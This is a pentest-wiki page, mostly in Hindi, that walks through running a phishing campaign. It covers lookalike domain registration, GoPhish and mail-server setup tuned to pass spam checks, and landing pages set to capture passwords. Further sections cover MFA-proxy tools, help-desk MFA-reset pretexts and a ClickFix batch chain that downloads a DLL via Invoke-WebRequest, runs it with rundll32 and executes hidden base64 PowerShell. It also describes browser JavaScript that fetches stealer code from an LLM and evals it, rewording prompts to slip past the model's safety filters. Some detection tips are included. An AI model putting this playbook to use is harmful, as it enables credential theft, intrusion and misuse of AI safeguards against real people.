# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Victim का recon करें
1. **victim domain** चुनें।
2. Victim द्वारा उपयोग किए गए **login portals** को **search करते हुए** कुछ basic web enumeration करें और तय करें कि किसकी **impersonate** करनी है।
3. Emails **find** करने के लिए कुछ **OSINT** का उपयोग करें।
2. Environment तैयार करें
1. Phishing assessment के लिए उपयोग करने वाला **domain buy** करें
2. संबंधित email service records (**SPF, DMARC, DKIM, rDNS**) configure करें
3. **gophish** के साथ VPS configure करें
3. Campaign तैयार करें
1. **email template** तैयार करें
2. credentials steal करने के लिए **web page** तैयार करें
4. Campaign launch करें!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Domain name में original domain का एक महत्वपूर्ण **keyword** **contains** होता है (e.g., zelster.com-management.com).
- **hypened subdomain**: Subdomain के **dot को hyphen से change** करें (e.g., www-zelster.com).
- **New TLD**: वही domain, लेकिन **new TLD** के साथ (e.g., zelster.org)
- **Homoglyph**: Domain name में एक letter को **similar दिखने वाले letters** से **replace** करता है (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain name के अंदर दो letters को **swap** करता है (e.g., zelsetr.com).
- **Singularization/Pluralization**: Domain name के end में “s” जोड़ता या हटाता है (e.g., zeltsers.com).
- **Omission**: Domain name के एक letter को **remove** करता है (e.g., zelser.com).
- **Repetition:** Domain name के एक letter को **repeat** करता है (e.g., zeltsser.com).
- **Replacement**: Homoglyph जैसा, लेकिन कम stealthy. यह domain name के letters में से एक को replace करता है, शायद keyboard पर original letter के पास वाले letter से (e.g, zektser.com).
- **Subdomained**: Domain name के अंदर एक **dot** introduce करें (e.g., ze.lster.com).
- **Insertion**: Domain name में एक letter **insert** करता है (e.g., zerltser.com).
- **Missing dot**: TLD को domain name में append करें. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

एक **possibility** है कि storage या communication में मौजूद कुछ bits, solar flares, cosmic rays, या hardware errors जैसी विभिन्न वजहों से automatically flip हो जाएँ।

जब इस concept को **DNS requests** पर लागू किया जाता है, तो यह possible है कि **DNS server द्वारा received domain** वही न हो जो initially requested था।

उदाहरण के लिए, domain "windows.com" में एक single bit modification इसे "windnws.com." में बदल सकता है।

Attackers इस बात का **advantage** उठाकर victim's domain से मिलते-जुलते multiple bit-flipping domains register कर सकते हैं। उनका intention legitimate users को अपनी infrastructure पर redirect करना है।

More information के लिए पढ़ें [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

आप [https://www.expireddomains.net/](https://www.expireddomains.net) में जाकर एक expired domain search कर सकते हैं जिसे आप use कर सकें.\
यह सुनिश्चित करने के लिए कि आप जो expired domain buy करने जा रहे हैं उसका **good SEO** पहले से है, आप देख सकते हैं कि उसे किस category में रखा गया है:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

More valid email addresses **discover** करने या पहले से **discovered** emails को **verify** करने के लिए आप victim के smtp servers पर उन्हें brute-force कर सकते हैं. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
इसके अलावा, यह न भूलें कि यदि users अपनी mails access करने के लिए **any web portal** use करते हैं, तो आप check कर सकते हैं कि वह **username brute force** के लिए vulnerable है या नहीं, और possible होने पर vulnerability exploit करें।

## Configuring GoPhish

### Installation

आप इसे [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) से download कर सकते हैं

इसे `/opt/gophish` के अंदर download और decompress करें और `/opt/gophish/gophish` execute करें\
Output में port 3333 पर admin user के लिए आपको एक password मिलेगा। इसलिए, उस port तक access करें और उन credentials का उपयोग करके admin password बदलें। आपको उस port को local तक tunnel करने की आवश्यकता हो सकती है:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### कॉन्फ़िगरेशन

**TLS certificate configuration**

इस चरण से पहले आपको **already bought the domain** होना चाहिए जिसे आप इस्तेमाल करने वाले हैं और वह **VPS की IP** की ओर **pointing** होना चाहिए जहाँ आप **gophish** configure कर रहे हैं।
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish के execution को रोकें और इसे configure करें।\
`/opt/gophish/config.json` को निम्नलिखित के अनुसार modify करें (https के use पर ध्यान दें):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service को configure करें**

gophish service बनाने के लिए ताकि इसे automatically start किया जा सके और service के रूप में manage किया जा सके, आप `/etc/init.d/gophish` file को निम्नलिखित content के साथ create कर सकते हैं:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
सेवा को कॉन्फ़िगर करना और यह जांचना समाप्त करें:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## mail server और domain को configure करना

### Wait & be legit

किसी domain की उम्र जितनी ज़्यादा होगी, उसके spam के रूप में पकड़े जाने की संभावना उतनी ही कम होगी। इसलिए phishing assessment से पहले जितना हो सके उतना समय इंतज़ार करना चाहिए (कम से कम 1week)। साथ ही, अगर आप किसी reputational sector के बारे में एक page डालते हैं, तो हासिल होने वाली reputation बेहतर होगी।

ध्यान दें कि भले ही आपको एक हफ्ता इंतज़ार करना पड़े, आप अभी सारी चीज़ें configure करना खत्म कर सकते हैं।

### Reverse DNS (rDNS) record configure करें

एक rDNS (PTR) record सेट करें जो VPS के IP address को domain name से resolve करे।

### Sender Policy Framework (SPF) Record

आपको **new domain के लिए एक SPF record configure करना होगा**। अगर आपको नहीं पता कि SPF record क्या है, तो [**यह page पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

आप अपना SPF policy generate करने के लिए [https://www.spfwizard.net/](https://www.spfwizard.net) का उपयोग कर सकते हैं (VPS machine का IP use करें)

![phishing domain के लिए SPF record generate करने वाला SPF Wizard form](<../../images/image (1037).png>)

यह वह content है जिसे domain के अंदर एक TXT record में set करना होगा:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

आपको **नए domain के लिए एक DMARC record configure करना होगा**। अगर आपको नहीं पता कि DMARC record क्या है [**इस page को पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

आपको hostname `_dmarc.<domain>` की ओर pointing एक नया DNS TXT record बनाना होगा, जिसमें निम्न content होगा:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

आपको नए domain के लिए एक DKIM **configure** करना होगा। अगर आपको नहीं पता कि DMARC record क्या है [**इस page को पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

यह tutorial इस पर आधारित है: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> आपको DKIM key द्वारा generate किए गए दोनों B64 values को concatenate करना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपने email configuration score का test करें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com) का उपयोग करके कर सकते हैं\
बस page खोलें और जो address वे दें, उस पर एक email भेजें:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
आप अपनी **email configuration** भी **check** कर सकते हैं `check-auth@verifier.port25.com` पर एक email भेजकर और **response पढ़कर** (इसके लिए आपको **port 25** **open** करना होगा और अगर आप email को root के रूप में भेजते हैं तो response को file _/var/mail/root_ में देखना होगा)।\
पुष्टि करें कि आप सभी tests पास करते हैं:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
आप अपने नियंत्रण वाले **Gmail** पर भी **message** भेज सकते हैं, और अपने Gmail inbox में **email’s headers** जांच सकते हैं, `dkim=pass` `Authentication-Results` header field में मौजूद होना चाहिए।
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) आपको बता सकती है कि आपका domain spamhouse द्वारा block किया जा रहा है या नहीं। आप अपने domain/IP को हटाने का अनुरोध यहां कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​आप अपने domain/IP को हटाने का अनुरोध [https://sender.office.com/](https://sender.office.com) पर कर सकते हैं।

## Create & Launch GoPhish Campaign

### Sending Profile

- sender profile की पहचान के लिए कुछ **name** सेट करें
- तय करें कि आप किस account से phishing emails भेजने वाले हैं। Suggestions: _noreply, support, servicedesk, salesforce..._
- आप username और password खाली छोड़ सकते हैं, लेकिन Ignore Certificate Errors को check करना सुनिश्चित करें

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> यह सलाह दी जाती है कि सब कुछ सही से काम कर रहा है या नहीं, यह जांचने के लिए "**Send Test Email**" functionality का उपयोग करें।\
> मैं सलाह दूंगा कि परीक्षणों के दौरान blacklisted होने से बचने के लिए test emails को 10min mails addresses पर भेजें।

### Email Template

- template की पहचान के लिए कुछ **name** सेट करें
- फिर एक **subject** लिखें (कुछ भी अजीब नहीं, बस ऐसा कुछ जो आप एक regular email में पढ़ने की उम्मीद कर सकते हैं)
- सुनिश्चित करें कि आपने "**Add Tracking Image**" check किया है
- **email template** लिखें (आप नीचे दिए उदाहरण की तरह variables का उपयोग कर सकते हैं):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **ईमेल की credibility बढ़ाने के लिए**, client के email से कोई signature इस्तेमाल करना recommended है। Suggestions:

- एक **non existent address** पर email भेजें और check करें कि response में कोई signature है या नहीं।
- **Public emails** जैसे info@ex.com या press@ex.com या public@ex.com search करें और उन्हें email भेजें तथा response का wait करें।
- किसी **valid discovered** email से contact करने की कोशिश करें और response का wait करें

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template files को भी **attach** करने की अनुमति देता है। अगर आप specially crafted files/documents से NTLM challenges steal करना भी चाहते हैं, तो [यह page पढ़ें](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)।

### Landing Page

- एक **name** लिखें
- web page का **HTML code लिखें**। ध्यान दें कि आप web pages को **import** कर सकते हैं।
- **Capture Submitted Data** और **Capture Passwords** mark करें
- एक **redirection** set करें

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> आमतौर पर आपको page के HTML code को modify करना होगा और local में कुछ tests करने होंगे (शायद किसी Apache server का उपयोग करके) **जब तक results आपको पसंद न आएं।** फिर, वही HTML code box में लिखें।\
> ध्यान दें कि अगर आपको HTML के लिए **कुछ static resources** इस्तेमाल करने हों (शायद कुछ CSS और JS pages), तो आप उन्हें _**/opt/gophish/static/endpoint**_ में save कर सकते हैं और फिर उन्हें _**/static/\<filename>**_ से access कर सकते हैं

> [!TIP]
> redirection के लिए आप **users को victim के legit main web page पर redirect** कर सकते हैं, या उन्हें उदाहरण के लिए _/static/migration.html_ पर redirect कर सकते हैं, कुछ **spinning wheel (**[**https://loading.io/**](https://loading.io)**) 5 seconds के लिए** डालें और फिर indicate करें कि process successful था।

### Users & Groups

- एक name set करें
- **data import करें** (ध्यान दें कि example के लिए template का उपयोग करने के लिए आपको प्रत्येक user का firstname, last name और email address चाहिए)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

अंत में, एक name, email template, landing page, URL, sending profile और group चुनकर campaign बनाएं। ध्यान दें कि URL victims को भेजा गया link होगा

ध्यान दें कि **Sending Profile test email भेजने की अनुमति देता है ताकि final phishing email कैसा दिखेगा यह देखा जा सके**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> मैं recommend करूंगा कि आप test emails को 10min mails addresses पर भेजें ताकि testing करते समय blacklisted होने से बचा जा सके।

जब सब कुछ ready हो जाए, बस campaign launch करें!

## Website Cloning

अगर किसी भी कारण से आप website clone करना चाहते हैं, तो following page देखें:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

कुछ phishing assessments (mainly for Red Teams) में आप **ऐसी files भेजना** चाहेंगे जिनमें किसी तरह का backdoor हो (शायद कोई C2 या शायद कुछ ऐसा जो authentication trigger करे)।\
कुछ examples के लिए following page देखें:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

पिछला attack काफी clever है क्योंकि आप एक real website fake कर रहे हैं और user द्वारा दी गई information इकट्ठा कर रहे हैं। दुर्भाग्य से, अगर user ने सही password नहीं डाला या अगर आपने fake की हुई application 2FA के साथ configured है, तो **यह information आपको trick किए गए user की impersonation करने नहीं देगी**।

यहीं पर [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) और [**muraena**](https://github.com/muraenateam/muraena) जैसे tools useful होते हैं। यह tool आपको MitM जैसी attack generate करने देगा। मूल रूप से, attack निम्न तरीके से काम करता है:

1. आप real webpage के login form की **impersonation** करते हैं।
2. User अपनी **credentials** आपकी fake page पर **send** करता है और tool उन्हें real webpage पर send करता है, **checking if the credentials work**।
3. अगर account **2FA** के साथ configured है, तो MitM page इसके लिए पूछेगा और जैसे ही **user introduces** it tool इसे real web page पर send करेगा।
4. User authenticated होने के बाद आप (attacker के रूप में) **captured credentials, 2FA, cookie और हर interaction की कोई भी information** रखेंगे, जब tool MitM perform कर रहा होगा।

### Via VNC

अगर आप victim को original जैसी दिखने वाली malicious page पर **भेजने** की बजाय उसे एक ऐसे **VNC session** पर भेजें जिसमें browser real web page से connected हो, तो क्या होगा? आप देख पाएंगे कि वह क्या करता है, password steal कर सकते हैं, MFA इस्तेमाल हुआ हो, cookies...\
आप यह [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) से कर सकते हैं

## Detecting the detection

Obviously यह जानने के best तरीकों में से एक कि आप busted हुए हैं या नहीं, यह है कि **अपने domain को blacklists में search** करें। अगर वह listed दिखाई देता है, तो somehow आपका domain suspicious के रूप में detected था।\
यह check करने का एक आसान तरीका कि आपका domain किसी blacklist में दिखाई देता है या नहीं, [https://malwareworld.com/](https://malwareworld.com) का उपयोग करना है

हालांकि, victim **wild में suspicious phishing activity को actively देख रहा है या नहीं** यह जानने के और तरीके भी हैं, जैसा कि यहां explained है:


{{#ref}}
detecting-phising.md
{{#endref}}

आप victims domain जैसा बहुत similar नाम वाला **domain खरीद** सकते हैं **और/या** आपके control वाले domain के किसी **subdomain** के लिए **certificate generate** कर सकते हैं जिसमें victim domain का **keyword** हो। अगर **victim** उनके साथ किसी भी तरह की **DNS या HTTP interaction** करता है, तो आपको पता चल जाएगा कि **वह suspicious domains को actively देख रहा है** और आपको बहुत stealth होना पड़ेगा।

### Evaluate the phishing

अपने email के spam folder में जाने, blocked होने, या successful होने का आकलन करने के लिए [**Phishious** ](https://github.com/Rices/Phishious) का उपयोग करें।

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly email lures को पूरी तरह छोड़ देते हैं और MFA defeat करने के लिए **directly service-desk / identity-recovery workflow** को target करते हैं। attack पूरी तरह "living-off-the-land" है: operator valid credentials का ownership ले लेता है, फिर built-in admin tooling के साथ pivot करता है – malware की आवश्यकता नहीं होती।

### Attack flow
1. Victim की recon
* LinkedIn, data breaches, public GitHub, आदि से personal & corporate details harvest करें
* high-value identities (executives, IT, finance) identify करें और password / MFA reset के लिए **exact help-desk process** enumerate करें।
2. Real-time social engineering
* spoofed caller-ID या cloned voice के साथ target की impersonation करते हुए help-desk को phone, Teams या chat करें।
* knowledge-based verification पास करने के लिए पहले से collected PII दें।
* agent को **MFA secret reset** करने या registered mobile number पर **SIM-swap** करने के लिए convince करें।
3. Immediate post-access actions (≤60 min in real cases)
* किसी भी web SSO portal के through foothold establish करें।
* built-ins के साथ AD / AzureAD enumerate करें (कोई binaries drop नहीं):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* **WMI**, **PsExec**, या environment में पहले से whitelisted legitimate **RMM** agents के साथ lateral movement करें।

### Detection & Mitigation
* help-desk identity recovery को एक **privileged operation** मानें – step-up auth & manager approval आवश्यक करें।
* ऐसे **Identity Threat Detection & Response (ITDR)** / **UEBA** rules deploy करें जो इनके बारे में alert करें:
* MFA method changed + नए device / geo से authentication।
* same principal की immediate elevation (user-→-admin)।
* help-desk calls record करें और किसी भी reset से पहले **पहले से registered number पर call-back** enforce करें।
* **Just-In-Time (JIT) / Privileged Access** implement करें ताकि newly reset accounts automatic high-privilege tokens inherit **न** करें।

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews high-touch ops की cost mass attacks से offset करते हैं जो **search engines & ad networks** को delivery channel में बदल देते हैं।

1. **SEO poisoning / malvertising** `chromium-update[.]site` जैसी fake result को top search ads तक push करता है।
2. Victim एक छोटा **first-stage loader** डाउनलोड करता है (अक्सर JS/HTA/ISO)। Unit 42 द्वारा देखे गए examples:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookies + credential DBs exfiltrate करता है, फिर एक **silent loader** pull करता है जो *realtime* में decide करता है कि deploy करना है:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* newly-registered domains block करें & **Advanced DNS / URL Filtering** को *search-ads* के साथ-साथ e-mail पर भी enforce करें।
* software installation को signed MSI / Store packages तक restrict करें, policy द्वारा `HTA`, `ISO`, `VBS` execution deny करें।
* browsers के child processes जो installers खोल रहे हों, उनके लिए monitor करें:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loaders द्वारा अक्सर abused होने वाले LOLBins को hunt करें (e.g. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory जिसमें एक **Update** button हो जो step-by-step “fix” instructions दिखाए। Victims को बताया जाता है कि वे एक batch चलाएँ जो DLL डाउनलोड करे और उसे `rundll32` के जरिए execute करे।
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload को `%TEMP%` में drop करता है, एक short sleep network jitter छुपाता है, फिर `rundll32` exported entrypoint (`notepad`) call करता है।
* DLL host identity beacon करती है और हर कुछ minutes में C2 poll करती है। Remote tasking **base64-encoded PowerShell** के रूप में आता है जिसे hidden और policy bypass के साथ execute किया जाता है:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* यह C2 flexibility बनाए रखता है (server DLL update किए बिना tasks swap कर सकता है) और console windows छुपाता है। `rundll32.exe` के PowerShell children को `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` के साथ एक साथ hunt करें।
* Defenders ऐसे HTTP(S) callbacks देख सकते हैं जैसे `...page.php?tynor=<COMPUTER>sss<USER>` और DLL load के बाद 5-minute polling intervals।

---

## AI-Enhanced Phishing Operations
Attackers अब पूरी तरह personalised lures और real-time interaction के लिए **LLM & voice-clone APIs** को chain करते हैं।

| Layer | Threat actor द्वारा example use |
|-------|-----------------------------|
|Automation|Randomized wording & tracking links के साथ >100 k emails / SMS generate और send करें।|
|Generative AI|Public M&A, social media से अंदरूनी jokes को reference करते हुए *one-off* emails बनाएं; callback scam में deep-fake CEO voice।|
|Agentic AI|Autonomously domains register करें, open-source intel scrape करें, और जब victim click करे लेकिन creds submit न करे तो next-stage mails craft करें।|

**Defence:**
• Untrusted automation से भेजे गए messages को highlight करने वाले **dynamic banners** जोड़ें (ARC/DKIM anomalies के through)।
• High-risk phone requests के लिए **voice-biometric challenge phrases** deploy करें।
• Awareness programmes में AI-generated lures continuously simulate करें – static templates obsolete हो चुके हैं।

Credential phishing के लिए agentic browsing abuse भी देखें:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory और detection के लिए local CLI tools और MCP के AI agent abuse भी देखें:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers benign-looking HTML ship कर सकते हैं और एक **trusted LLM API** से JavaScript पूछकर, फिर उसे in-browser execute करके **stealer को runtime पर generate** कर सकते हैं (e.g., `eval` या dynamic `<script>`).

1. **Prompt-as-obfuscation:** prompt में exfil URLs/Base64 strings encode करें; safety filters bypass करने और hallucinations कम करने के लिए wording iterate करें।
2. **Client-side API call:** load होने पर JS public LLM (Gemini/DeepSeek/etc.) या CDN proxy को call करता है; static HTML में सिर्फ prompt/API call मौजूद होता है।
3. **Assemble & exec:** response को concatenate करके execute करें (visit के अनुसार polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code lure को personalises करता है (उदा., LogoKit token parsing) और creds को prompt-hidden endpoint पर posts करता है।

**Evasion traits**
- Traffic well-known LLM domains या reputable CDN proxies पर hits करता है; कभी-कभी backend तक WebSockets के जरिए।
- No static payload; malicious JS सिर्फ render के बाद मौजूद होता है।
- Non-deterministic generations हर session के लिए **unique** stealers produce करते हैं।

**Detection ideas**
- JS enabled के साथ sandboxes चलाएँ; **runtime `eval`/dynamic script creation sourced from LLM responses** को flag करें।
- Front-end POSTs to LLM APIs के तुरंत बाद returned text पर `eval`/`Function` होने की hunt करें।
- Client traffic में unsanctioned LLM domains के साथ subsequent credential POSTs पर alert करें।

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Classic push-bombing के अलावा, operators help-desk call के दौरान बस **force a new MFA registration** कर देते हैं, जिससे user का existing token nullify हो जाता है। Subsequent login prompt victim को legitimate लगता है।
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta इवेंट्स की निगरानी करें जहाँ **`deleteMFA` + `addMFA`** **same IP** से कुछ ही मिनटों के भीतर होते हैं।



## Clipboard Hijacking / Pastejacking

हमलावर किसी compromised या typosquatted web page से चुपचाप malicious commands victim के clipboard में copy कर सकते हैं, और फिर user को उन्हें **Win + R**, **Win + X** या terminal window में paste करने के लिए trick कर सकते हैं, जिससे बिना किसी download या attachment के arbitrary code execute हो जाता है।


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* एक lure page (जैसे fake ministry/CERT “channel”) WhatsApp Web/Desktop QR दिखाती है और victim को scan करने के लिए instruct करती है, जिससे attacker silently **linked device** के रूप में add हो जाता है।
* Attacker तुरंत chat/contact visibility हासिल कर लेता है जब तक session remove न हो जाए। Victims बाद में “new device linked” notification देख सकते हैं; defenders untrusted QR pages पर visits के तुरंत बाद unexpected device-link events के लिए hunt कर सकते हैं।

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators increasingly अपनी phishing flows को एक simple device check के पीछे gate कर रहे हैं ताकि desktop crawlers final pages तक कभी न पहुँचें। एक common pattern एक छोटा script है जो touch-capable DOM test करता है और result को server endpoint पर post करता है; non‑mobile clients को HTTP 500 (या blank page) मिलता है, जबकि mobile users को पूरा flow serve किया जाता है।

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server का व्यवहार अक्सर देखा गया:
- पहले load के दौरान एक session cookie सेट करता है।
- `POST /detect {"is_mobile":true|false}` स्वीकार करता है।
